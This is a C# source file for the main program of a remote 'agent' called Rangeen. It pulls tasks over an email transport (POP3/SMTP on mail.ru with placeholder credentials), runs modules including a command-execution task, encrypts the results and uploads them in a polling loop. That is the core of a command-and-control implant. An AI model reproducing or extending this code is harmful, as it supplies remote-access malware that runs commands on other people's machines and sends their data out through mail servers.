using System;
using Rangeen.Task;
using Rangeen.Transport;
using System.Threading;
using UtilsLib;

namespace Rangeen
{
    class Program
    {
        public const string AgentVersion = "0.1";
        public static TaskManager TaskManager;
        public static TransportManager TransportManager;
        public static Config Config;

        static void Main(string[] args)
        {
            Initialize();

            MainLoop();
            Console.ReadKey();
        }

        static void Initialize()
        {
            // read init config
            // TODO: read init config
            Config = new Config();


            // setup fields
            TaskManager = new TaskManager();
            TransportManager = new TransportManager();

            // add transports
            //var mailTransport = new MailTransport(new[] {                // 
            //    "pop3:pop.mail.ru", "smtp:smtp.mail.ru",                 // 
            //    "pop3port:995", "smtpport:587",                          // WARNING: DEBUG version of mailTransport
            //    "pop3login:example@mail.ru", "pop3password:password",      // 
            //    "smtplogin:example@mail.ru", "smtppassword:password" });    // 
            //TransportManager.AddTransport(mailTransport);


            // load modules
            TaskManager.AddNewTaskModule("CmdTask"); // add built-in task
            TaskManager.AddNewTaskModule("ConfigTask"); // add built-in task
            TaskManager.AddNewTaskModule("TaskExample.dll"); // WARNING: DEBUG TaskModule

            // TEST
            //TaskManager.StartNewTask("TaskExample", new[] { "test.txt", "asfaspufpaweiufgwe" }); // WARNING: DEBUG start task
            //TaskManager.StartNewTask("CmdTask", new[] { "", "echo ! this is echo !", "0", "0", "-1" }); // WARNING: DEBUG start CmdTask
            TaskManager.StartNewTask("ConfigTask", new[]                // 
            {                                                           // 
                "AddTransport", "MailTransport",                        // 
                "pop3:pop.mail.ru", "smtp:smtp.mail.ru",                // WARNING: DEBUG start ConfigTask
                "pop3port:995", "smtpport:587",                         // 
                "pop3login:example@mail.ru", "pop3password:password",      // 
                "smtplogin:example@mail.ru", "smtppassword:password"       // 
            });                                                         // 

        }


        static void MainLoop()
        {
            bool isRun = true;

            while (isRun)
            {
#if !DEBUG
                try
#endif
                {
                    // * Download and start task
                    TaskManager.ParseTasks(TransportManager.Download());

                    // * Upload results
                    // ReSharper disable once ForCanBeConvertedToForeach
                    int index = 0;
                    for (int i = 0; i < TaskManager.Results.Count; i++) // do not use foreach loop here!
                    {
                        // Crypt results
                        var taskResultData = Cryptor.Crypt(TaskManager.Results[index].BinData, Cryptor.DEBUG_key);
                        var taskInfo = Cryptor.Crypt(TaskManager.Results[index].Task.TaskId.GetBytes(),
                            Cryptor.DEBUG_key);

                        // send results
                        if (!TransportManager.Upload(taskResultData, taskInfo))
                        {
                            index++; // leave a result for next time
                            Console.WriteLine("[MainLoop] TransportManager upload failed.");
                        }
                        else
                        {
                            TaskManager.Results.RemoveAt(index); // result sended, remove this
                            Console.WriteLine("[MainLoop] TransportManager successful upload.");
                        }
                    }

                    // * Wait
                    Thread.Sleep(Config.Interval);
                }
#if !DEBUG
                catch (Exception e)
                {
                    Console.WriteLine("[MainLoop] Exception: " + e.Message + "\n" + e.StackTrace);
                }
#endif
            }
        }

    }
}
